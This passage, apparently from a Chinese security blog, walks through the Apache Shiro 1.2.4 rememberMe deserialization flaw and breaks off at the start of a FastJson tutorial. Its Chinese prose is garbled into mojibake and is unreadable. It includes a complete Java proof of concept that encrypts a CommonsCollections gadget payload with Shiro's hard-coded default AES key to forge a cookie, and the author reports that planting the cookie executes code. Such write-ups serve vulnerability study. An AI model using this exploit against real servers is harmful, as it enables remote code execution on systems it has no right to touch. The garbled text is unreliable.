<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptionCipherKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>decryptionCipherKey <span class="token operator">=</span> decryptionCipherKey<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å‘ç°ï¼Œ<strong>AbstractRememberMeManager</strong>è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œä¼š<strong>setCipherKey</strong>ï¼Œè€Œè¿™ä¸ªkeyæ˜¯é»˜è®¤çš„ã€‚</p>
<p>åˆ†æåˆ°è¿™é‡Œï¼Œå¥½åƒå’Œæˆ‘ä»¬çš„remember Meæ²¡ä»€ä¹ˆå…³ç³»ï¼Œç»§ç»­å¾€ä¸‹çœ‹ã€‚</p>
<h4 id="RememberMeç”Ÿæˆ"><a href="#RememberMeç”Ÿæˆ" class="headerlink" title="RememberMeç”Ÿæˆ"></a>RememberMeç”Ÿæˆ</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223154957970.png" alt="image-20211223154957970" loading="lazy"></p>
<p>æˆ‘ä»¬åœ¨ç™»å½•æˆåŠŸè¿™é‡Œä¸‹ä¸ªæ–­ç‚¹,å‘ç°ä»–ä¼šcallåˆ°rememberIdentity()</p>
<p>æˆ‘ä»¬è·Ÿè¿›å»</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">rememberIdentity</span><span class="token punctuation">(</span><span class="token class-name">Subject</span> subject<span class="token punctuation">,</span> <span class="token class-name">AuthenticationToken</span> token<span class="token punctuation">,</span> <span class="token class-name">AuthenticationInfo</span> authcInfo<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">PrincipalCollection</span> principals <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getIdentityToRemember</span><span class="token punctuation">(</span>subject<span class="token punctuation">,</span> authcInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">rememberIdentity</span><span class="token punctuation">(</span>subject<span class="token punctuation">,</span> principals<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
    <span class="token keyword">protected</span> <span class="token class-name">PrincipalCollection</span> <span class="token function">getIdentityToRemember</span><span class="token punctuation">(</span><span class="token class-name">Subject</span> subject<span class="token punctuation">,</span> <span class="token class-name">AuthenticationInfo</span> info<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> info<span class="token punctuation">.</span><span class="token function">getPrincipals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å‘ç°principalså®é™…ä¸Šæˆ‘ä»¬çš„ç™»å½•å</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163019109.png" alt="image-20211223163019109" loading="lazy"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">rememberIdentity</span><span class="token punctuation">(</span><span class="token class-name">Subject</span> subject<span class="token punctuation">,</span> <span class="token class-name">PrincipalCollection</span> accountPrincipals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">convertPrincipalsToBytes</span><span class="token punctuation">(</span>accountPrincipals<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">rememberSerializedIdentity</span><span class="token punctuation">(</span>subject<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>è·å–åˆ°è´¦å·åï¼Œåˆä¼šcallåˆ°rememberIdentity()</p>
<p>æˆ‘ä»¬è·Ÿè¿›convertPrincipalsToBytes()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163224292.png" alt="image-20211223163224292" loading="lazy"></p>
<p>å†è·Ÿè¿›encrpyt()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163334597.png" alt="image-20211223163334597" loading="lazy"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getEncryptionCipherKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>encryptionCipherKey<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°<code>encryptionCipherKey</code>åœ¨ä¹‹å‰åˆ†æçš„æ—¶å€™å‡ºç°è¿‡</p>
<p>å†å›é¡¾ä¸€ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_CIPHER_KEY_BYTES <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token class-name">AbstractRememberMeManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setCipherKey</span><span class="token punctuation">(</span>DEFAULT_CIPHER_KEY_BYTES<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„è®¾ç½®äº†cipher key</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cipherKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setEncryptionCipherKey</span><span class="token punctuation">(</span>cipherKey<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®åŠ å¯†å¯†é’¥</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setDecryptionCipherKey</span><span class="token punctuation">(</span>cipherKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setEncryptionCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encryptionCipherKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>encryptionCipherKey <span class="token operator">=</span> encryptionCipherKey<span class="token punctuation">;</span><span class="token comment">//ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå…¶å®encryptionCipherKeyå°±æ˜¯ä¸Šé¢é»˜è®¤çš„key</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDecryptionCipherKey</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decryptionCipherKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>decryptionCipherKey <span class="token operator">=</span> decryptionCipherKey<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åˆ°ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»æ˜ç™½ï¼Œç”¨æˆ·ä¿¡æ¯è¢«åšäº†AESåŠ å¯†</p>
<p>å½“åŠ å¯†æ•°æ®éƒ½è¢«è¿”å›åï¼Œä¸‹ä¸€æ­¥ä¼šæ‰§è¡ŒrememberSerializedIdentity()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163615319.png" alt="image-20211223163615319" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163755978.png" alt="image-20211223163755978" loading="lazy"></p>
<p><strong>å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‡ºcookieä¸­çš„rememberMeçš„äº§ç”Ÿæµç¨‹</strong></p>
<ul>
<li>åºåˆ—åŒ–ç”¨æˆ·å</li>
<li>AESåŠ å¯†åºåˆ—åŒ–åçš„æ•°æ®</li>
<li>base64ç¼–ç å¤„ç†ä¸Šä¸€æ­¥çš„æ•°æ®</li>
<li>æœ€åæ”¾å…¥cookie</li>
</ul>
<h4 id="RememberMeè§£å¯†"><a href="#RememberMeè§£å¯†" class="headerlink" title="RememberMeè§£å¯†"></a>RememberMeè§£å¯†</h4><p>åœ¨AbstractRememberMeManager#getRememberedPrincipalsä¸‹ä¸€ä¸ªæ–­ç‚¹</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165224129.png" alt="image-20211223165224129" loading="lazy"></p>
<p>ç„¶åé‡å¯æœåŠ¡å™¨ï¼Œä¼šè¢«æ–­ä¸‹æ¥</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165446209.png" alt="image-20211223165446209" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165804156.png" alt="image-20211223165804156" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165926366.png" alt="image-20211223165926366" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165955572.png" alt="image-20211223165955572" loading="lazy"></p>
<p><strong>ç°åœ¨RememberMeè§£å¯†çš„æµç¨‹ä¹Ÿæ˜¾è€Œæ˜“è§:</strong></p>
<ul>
<li>ä»Cookieä¸­è·å–RememberMeå€¼</li>
<li>è·å–åˆ°çš„å€¼è¿›è¡Œbase64è§£ç </li>
<li>base64è§£ç </li>
<li>ååºåˆ—åŒ–</li>
</ul>
<h3 id="æ¼æ´åˆ©ç”¨åŠPOC"><a href="#æ¼æ´åˆ©ç”¨åŠPOC" class="headerlink" title="æ¼æ´åˆ©ç”¨åŠPOC"></a>æ¼æ´åˆ©ç”¨åŠPOC</h3><p>é¦–å…ˆåœ¨pom.xmlä¸­æ·»åŠ commons-collections dependency</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ³¨æ„è¦reload mavenï¼ˆå› ä¸ºå¿˜è®°é‡è½½mavenï¼Œåœ¨è¿™é‡Œå¡äº†åŠå¤©ï¼Œå‘ç°åé¢çš„ClassLoaderä¸€ç›´æ‰¾ä¸åˆ°classï¼Œè°ƒè¯•åŠå¤©ä¹Ÿæ²¡ææ˜ç™½ä¸ºä»€ä¹ˆæ²¡æœ‰è¿™ä¸ªåº“ï¼‰</p>
<p>è¿™é‡Œæˆ‘ä»¬å°†ç”¨åˆ°<strong>CommonsCollections11</strong>çš„é“¾ï¼ŒCC6çš„é“¾åœ¨æ­¤å¤„ä¸èƒ½æ‰“æˆåŠŸ - å› ä¸ºTransformer[]ä¼šåœ¨å¯»æ‰¾classçš„æ—¶å€™å‡ºç°æ ¼å¼é—®é¢˜ï¼Œå…¶ä¸­ä¼šæ¶‰åŠåˆ°<strong>ParallelWebappClassLoader</strong>çš„çˆ¶ç±»<strong>WebappClassLoaderBase#loadClass</strong>ï¼›å› æ­¤æˆ‘ä»¬é€‰æ‹©CommonCollections11è¿™ä¸ªé“¾(æ²¡æœ‰Transformer[]æ•°ç»„)</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232137157.png" alt="image-20211223232137157" loading="lazy"></p>
<p>è¯¦è§ <a target="_blank" rel="noopener" href="https://www.cnblogs.com/W4nder/p/14508817.html%EF%BC%8C%E6%88%91%E5%9C%A8%E6%AD%A4%E5%A4%84%E5%B0%B1%E4%B8%8D%E5%A4%9A%E8%AE%B2%E8%A7%A3%E3%80%82">https://www.cnblogs.com/W4nder/p/14508817.htmlï¼Œæˆ‘åœ¨æ­¤å¤„å°±ä¸å¤šè®²è§£ã€‚</a></p>
<p><strong>POCæ„é€ </strong></p>
<p><strong>æ­¤å¤„æˆ‘æ–°å»ºäº†ä¸€ä¸ªé¡¹ç›®ï¼ŒåŒæ—¶å¯¼å…¥äº†ä¸‰ä¸ªåº“</strong></p>
<ul>
<li>shiro-core-1.2.4</li>
<li>slf4j-api-1.6.4</li>
<li>slf4j-simple-1.6.4</li>
</ul>
<p>è¿™ä¸‰ä¸ªjaråŒ…å¯ä»¥åœ¨shiro-webé¡¹ç›®ä¸­æ‰¾åˆ°: æ‰“å¼€shiro-webé¡¹ç›®ä¸‹çš„pom.xmlæ–‡ä»¶ï¼Œæœç´¢è¿™ä¸‰ä¸ªåº“ï¼Œç„¶åé¼ æ ‡æ”¾åœ¨åå­—ä¸Šé¢å³å¯çœ‹åˆ°è·¯å¾„</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223233932961.png" alt="image-20211223233932961" loading="lazy"></p>
<p>ç„¶åæ‰¾åˆ°ç›¸åº”çš„ç›®å½•ï¼Œcopy jaråŒ…å¹¶å¯¼å…¥æˆ‘ä»¬çš„POCé¡¹ç›®å³å¯</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223234007242.png" alt="image-20211223234007242" loading="lazy"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>codec<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">AesCipherService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>shiro<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ByteSource</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> shiro550 <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_CIPHER_KEY_BYTES <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é»˜è®¤å¯†é’¥</span>

        <span class="token class-name">AesCipherService</span> aesCipherService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AesCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilObj <span class="token operator">=</span> <span class="token function">getSerializedObj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¾—åˆ°byteæ•°ç»„ç±»å‹çš„åºåˆ—åŒ–æ•°æ®</span>

        <span class="token class-name">ByteSource</span> finalsource <span class="token operator">=</span> aesCipherService<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>evilObj<span class="token punctuation">,</span> DEFAULT_CIPHER_KEY_BYTES<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¯¹è¯¥æ¶æ„åºåˆ—åŒ–æ•°æ®è¿›è¡ŒAESåŠ å¯†</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>finalsource<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ‰“å°å‡ºåŠ å¯†åçš„rememberMe</span>
      

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getSerializedObj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>

        <span class="token keyword">int</span> n<span class="token punctuation">;</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åŠ è½½cc11ç”Ÿæˆçš„æ¶æ„åºåˆ—åŒ–æ–‡ä»¶</span>
        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token operator">=</span>fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸ºä»€ä¹ˆæˆ‘ä»¬åŠ å¯†åå¯ä»¥ç›´æ¥è¿”å›**finalsource.toString()**ï¼Œä¸æ˜¯è¯´æœ€åè¦base64ç¼–ç å—ï¼Ÿ</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232837239.png" alt="image-20211223232837239" loading="lazy"></p>
<p>æˆ‘ä»¬è·Ÿè¸ªåˆ°æœ€åå¯ä»¥å‘ç°ï¼Œå…¶è¿”å›äº†<strong>SimpleByteSource#toString()<strong>æ–¹æ³•ï¼Œè€Œå®ƒå°±æ˜¯è¿”å›äº†</strong>toBase64()</strong></p>
<p>ç°åœ¨æˆ‘ä»¬å°†ç”Ÿæˆå‡ºæ¥çš„ä¸€ä¸²å­—ç¬¦å¤åˆ¶åˆ°cookieçš„<strong>rememberMe</strong>å¤„ï¼Œæ‰§è¡Œåå‘ç°è®¡ç®—å™¨å¼¹å‡ºã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232449924.png" alt="image-20211223232449924" loading="lazy"></p>
<h3 id="Reference-7"><a href="#Reference-7" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/W4nder/p/14508817.html">shiro-1.2.4ååºåˆ—åŒ–åˆ†æè¸©å‘</a></p>
<p>Pç¥-Javaæ¼«è°ˆ</p>
<h1 id="FastJsonååºåˆ—åŒ–æ¼æ´ç³»åˆ—"><a href="#FastJsonååºåˆ—åŒ–æ¼æ´ç³»åˆ—" class="headerlink" title="FastJsonååºåˆ—åŒ–æ¼æ´ç³»åˆ—"></a>FastJsonååºåˆ—åŒ–æ¼æ´ç³»åˆ—</h1><h2 id="å‰è¨€-5"><a href="#å‰è¨€-5" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>FastJsonæ˜¯ç”±é˜¿é‡Œå·´å·´å¼€å‘çš„ä¸€ä¸ªjavaåº“ï¼Œå¯å°†å¯¹è±¡å¿«é€Ÿè½¬æ¢ä¸ºjsonå­—ç¬¦ï¼ŒåŒæ—¶ä¹Ÿå¯å°†jsonå­—ç¬¦ä¸²è½¬åŒ–ä¸ºç›¸åº”çš„å¯¹è±¡</p>
<h2 id="Fastjsonçš„åŸºç¡€ä½¿ç”¨"><a href="#Fastjsonçš„åŸºç¡€ä½¿ç”¨" class="headerlink" title="Fastjsonçš„åŸºç¡€ä½¿ç”¨"></a>Fastjsonçš„åŸºç¡€ä½¿ç”¨</h2><h3 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h3><p>åœ¨åšRESTFULé¡¹ç›®çš„æ—¶å€™å¸¸å¸¸éœ€è¦å°†jsonæ•°æ®æ ¼å¼è¿›è¡Œè½¬æ¢ï¼Œæ¯”å¦‚å°†<code>&#123;name:&quot;leihehe&quot;, age: 18&#125;</code>è½¬æˆStudentç±»çš„Object</p>
<h3 id="ç¯å¢ƒæ­å»º-9"><a href="#ç¯å¢ƒæ­å»º-9" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>åœ¨MAVANä¸­æ·»åŠ fastjsonå³å¯ï¼Œæœ¬æ–‡å°†åˆ†æ1.2.4åŠå…¶ä¹‹åçš„å„ç§ç‰ˆæœ¬ï¼Œæµ‹è¯•æ—¶å°†ä¸‹é¢çš„versionè¿›è¡Œä¿®æ”¹å³å¯ã€‚</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="å°†å¯¹è±¡è½¬åŒ–ä¸ºjsonæ ¼å¼"><a href="#å°†å¯¹è±¡è½¬åŒ–ä¸ºjsonæ ¼å¼" class="headerlink" title="å°†å¯¹è±¡è½¬åŒ–ä¸ºjsonæ ¼å¼"></a>å°†å¯¹è±¡è½¬åŒ–ä¸ºjsonæ ¼å¼</h3><p>é¦–å…ˆå‡†å¤‡ä¸€ä¸ªUserç±»ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> name<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"constructor invoked"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"get name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"set name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"User&#123;"</span> <span class="token operator">+</span>
                <span class="token string">"name='"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å†™ä¸€ä¸ªmainæ–¹æ³•æµ‹è¯•ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/* Serialization */</span>
